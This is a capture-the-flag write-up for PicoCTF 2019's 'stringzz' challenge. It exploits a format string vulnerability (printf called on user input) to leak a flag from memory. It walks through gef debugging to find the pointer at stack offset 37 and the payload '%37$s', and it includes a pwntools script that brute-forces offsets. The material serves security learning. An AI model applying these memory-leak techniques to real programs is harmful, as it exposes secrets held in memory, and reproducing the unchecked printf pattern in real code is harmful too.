---
---
title: Leak the stack
description: Leak the stack using a format string attack.
---

# Format string - Leak the stack

## Summary

Two ways :

1. Find the exact offset of the data we want to leak.
2. Bruteforce the stack until we get the right offset.

Both methods work very well, only the first is more instructive.

## Challenge

### Statement

!!! note ""
    Challenge : `stringzz` from PicoCTF 2019.

Use a format string to pwn this [program](https://2019shell1.picoctf.com/static/31d401db5c499308034d1795794324ad/vuln) and get a flag.

### Source code

```c linenums="1"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAG_BUFFER 128
#define LINE_BUFFER_SIZE 2000

void printMessage3(char *in)
{
  puts("will be printed:\n");
  printf(in);
}
void printMessage2(char *in)
{
  puts("your input ");
  printMessage3(in);
}

void printMessage1(char *in)
{
  puts("Now ");
  printMessage2(in);
}

int main (int argc, char **argv)
{
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input);
    fflush(stdout);

}
```

## Answer

The content of the file is located inside the heap, but there is a pointer to the content of the `flag.txt` file inside the stack. So by using `%s`, the format string will display the string pointed by this address.

(For testing purposes, I created the `flag.txt` file with the content `FLAG{gg}`.)

We can find this address in the stack by setting a breakpoint on the call of the vulnerable `printf` function.

```
gef➤  disass printMessage3
Dump of assembler code for function printMessage3:
   0x000006ed <+0>:     push   ebp
   0x000006ee <+1>:     mov    ebp,esp
   0x000006f0 <+3>:     push   ebx
   0x000006f1 <+4>:     sub    esp,0x4
   0x000006f4 <+7>:     call   0x5f0 <__x86.get_pc_thunk.bx>
   0x000006f9 <+12>:    add    ebx,0x18bb
   0x000006ff <+18>:    sub    esp,0xc
   0x00000702 <+21>:    lea    eax,[ebx-0x1684]
   0x00000708 <+27>:    push   eax
   0x00000709 <+28>:    call   0x570 <puts@plt>
   0x0000070e <+33>:    add    esp,0x10
   0x00000711 <+36>:    sub    esp,0xc
   0x00000714 <+39>:    push   DWORD PTR [ebp+0x8]
   0x00000717 <+42>:    call   0x520 <printf@plt>
   0x0000071c <+47>:    add    esp,0x10
   0x0000071f <+50>:    nop
   0x00000720 <+51>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x00000723 <+54>:    leave
   0x00000724 <+55>:    ret
End of assembler dump.
gef➤  b *(printMessage3+42)
- Breakpoint 1 at 0x717
```

Let's run the program and find where the flag is located using the command `grep`.

```
gef➤  grep "FLAG{gg}"
[+] Searching 'FLAG{gg}' in memory
[+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
  0x56558a40 - 0x56558a4a  →   "FLAG{gg}\n"
  0x56558c10 - 0x56558c1a  →   "FLAG{gg}\n"
```

As you can see, the content of `flag.txt` is stored on the heap, but lets try to find `0x56558a40` or `0x56558c10` in the stack.

```
gef➤  x/50xw $sp
0xffffd1c0:     0x565585b0      0x0000000a      0x00000004      0x565556f9
0xffffd1d0:     0x00000001      0x56556fb4      0xffffd1f8      0x56555755
0xffffd1e0:     0x565585b0      0x56555995      0x56555993      0x56555731
0xffffd1f0:     0x00000001      0x56556fb4      0xffffd218      0x5655578e
0xffffd200:     0x565585b0      0x56555993      0x00000001      0x5655576a
0xffffd210:     0x00000001      0x56556fb4      0xffffd268      0x5655584d
0xffffd220:     0x565585b0      0x00000080      0x56558ad0      0x565557ae
0xffffd230:     0x00000001      0xf7fddab0      0x00000000      0xffffd324
0xffffd240:     0xf7f993bc      0x56556fb4      0xffffd32c      0x00000078
0xffffd250:     0x565585b0    > 0x56558a40 <    0x56558ad0      0x0b337100
0xffffd260:     0xffffd280      0x00000000      0x00000000      0xf7dc7a0d
0xffffd270:     0x00000001      0x565555b0      0x00000000      0xf7dc7a0d
0xffffd280:     0x00000001      0xffffd324
gef➤  x/s 0x56558a40
0x56558a40:     "FLAG{gg}\n"
```

As you can see, there is our address inside `> <`.
`0x56558a40` is a the 37th place in the stack, so we can retrieve it using `%37$s`.

```
$ ./vuln
input whatever string you want; then it will be printed back:

%37$s
Now
your input
will be printed:

FLAG{gg}
```

---

The other way to solve this challenge is by using bruteforce to leak all the stack until we get the flag :

Source code (solve.py) :

```python
#!/usr/bin/env python3
from pwn import process, log, context

PROGRAM = "./vuln"
DELIM = b"input whatever string you want; then it will be printed back:\n"

data = b""
i = 0
while b"FLAG{" not in data:
    log.info(f"Trying n°{i} ...")

    with context.local(log_level="error"):
        proc = process(PROGRAM)
        proc.sendlineafter(DELIM, f"%{i}$s".encode())
        proc.recvuntil(b"will be printed:\n\n")
        data = proc.recvall()

    log.info(f"Data : {data}")
    i += 1
```

Execution :

```
$ echo 'FLAG{gg}' > flag.txt
$ python3 solve.py
[*] Trying n°0 ...
[*] Data : b'%0$s\n'
[*] Trying n°1 ...
[*] Data : b''
[*] Trying n°2 ...
[*] Data : b''
[*] Trying n°3 ...
[*] Data : b'\x81\xc3\xbb\x18\n'
[...]
[*] Trying n°35 ...
[*] Data : b''
[*] Trying n°36 ...
[*] Data : b'%36$s\n\n'
[*] Trying n°37 ...
[*] Data : b'FLAG{gg}\n\n'
```